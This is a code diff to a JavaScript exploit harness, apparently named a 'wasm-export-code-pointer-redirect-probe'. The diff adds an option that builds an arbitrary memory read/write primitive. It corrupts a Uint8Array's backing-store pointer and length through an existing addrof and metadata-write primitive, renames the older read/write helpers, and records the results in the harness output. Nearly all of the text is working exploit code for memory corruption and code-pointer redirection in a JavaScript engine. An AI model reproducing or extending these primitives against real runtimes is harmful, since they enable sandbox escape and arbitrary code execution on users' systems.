@@ -46,6 +46,8 @@ const extraCellFields = process.env.EXTRA_CELL_FIELDS
   : [];
 const readBytes = Number(process.env.READ_BYTES || 64);
 const warmIterations = Number(process.env.WARM_ITERATIONS || 10000);
+const realTypedArrayArw = process.env.REAL_TYPEDARRAY_ARW === "1";
+const realArwViewSize = Number(process.env.REAL_ARW_VIEW_SIZE || 8);
 const retainedBridgeCarriers = [];
 
 const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
@@ -297,7 +299,7 @@ function wordsFromBytes(bytes) {
 
 const native = await buildNativeView();
 
-function withNativePointer(address, fn) {
+function withMetadataPointer(address, fn) {
   writeU64LE(native.metadataView, 16, address);
   try {
     return fn(new Uint8Array(native.victimBuffer));
@@ -306,14 +308,87 @@ function withNativePointer(address, fn) {
   }
 }
 
-function readAddress(address, length = readBytes) {
-  return withNativePointer(address, view => Buffer.from(view.subarray(0, Math.min(length, view.length))));
+function metadataReadAddress(address, length = readBytes) {
+  return withMetadataPointer(address, view => Buffer.from(view.subarray(0, Math.min(length, view.length))));
 }
 
-function writeAddress(address, bytes) {
-  return withNativePointer(address, view => {
+function metadataWriteAddress(address, bytes) {
+  return withMetadataPointer(address, view => {
     view.set(bytes, 0);
   });
+}
+
+let readAddress = metadataReadAddress;
+let writeAddress = metadataWriteAddress;
+let realArwSummary = null;
+
+async function buildRealTypedArrayArw() {
+  const rwView = new Uint8Array(realArwViewSize);
+  rwView.fill(0xcc);
+  const rwCellAddress = await addrof(rwView);
+  const rwPrefix = metadataReadAddress(rwCellAddress, 32);
+  const originalVector = readU64LEBytes(rwPrefix, 16);
+  const originalLength = readU64LEBytes(rwPrefix, 24);
+
+  if (!classifyPointer(rwCellAddress) || !classifyPointer(originalVector)) {
+    throw new Error(`real typed-array ARW setup found non-pointer cell/vector cell=${hex(rwCellAddress)} vector=${hex(originalVector)}`);
+  }
+
+  function restore() {
+    metadataWriteAddress(rwCellAddress + 16n, payloadU64(originalVector));
+    metadataWriteAddress(rwCellAddress + 24n, payloadU64(originalLength));
+  }
+
+  function withRealPointer(address, length, fn) {
+    const n = Math.max(1, length);
+    metadataWriteAddress(rwCellAddress + 16n, payloadU64(address));
+    metadataWriteAddress(rwCellAddress + 24n, payloadU64(BigInt(n)));
+    try {
+      return fn(rwView);
+    } finally {
+      restore();
+    }
+  }
+
+  function realReadAddress(address, length = readBytes) {
+    return withRealPointer(address, length, view => {
+      const out = Buffer.alloc(length);
+      for (let i = 0; i < length; i++) out[i] = view[i];
+      return out;
+    });
+  }
+
+  function realWriteAddress(address, bytes) {
+    return withRealPointer(address, bytes.length, view => {
+      for (let i = 0; i < bytes.length; i++) view[i] = bytes[i];
+    });
+  }
+
+  const restorePrefix = metadataReadAddress(rwCellAddress, 32);
+  const restoreVector = readU64LEBytes(restorePrefix, 16);
+  const restoreLength = readU64LEBytes(restorePrefix, 24);
+  if (restoreVector !== originalVector || restoreLength !== originalLength) {
+    restore();
+  }
+
+  return {
+    readAddress: realReadAddress,
+    writeAddress: realWriteAddress,
+    summary: {
+      viewSize: realArwViewSize,
+      rwCellAddress: hex(rwCellAddress),
+      originalVector: hex(originalVector),
+      originalLength: hex(originalLength),
+      cellPrefixWords: wordsFromBytes(rwPrefix),
+    },
+  };
+}
+
+if (realTypedArrayArw) {
+  const realArw = await buildRealTypedArrayArw();
+  readAddress = realArw.readAddress;
+  writeAddress = realArw.writeAddress;
+  realArwSummary = realArw.summary;
 }
 
 function writeU64Address(address, value) {
@@ -626,6 +701,8 @@ const output = {
   harness: "wasm-export-code-pointer-redirect-probe",
   noFfi: true,
   nativeHelperDylib: false,
+  realTypedArrayArw,
+  realArwSummary,
   markerImport,
   markerPath: markerImport ? markerPath : undefined,
   markerBefore,
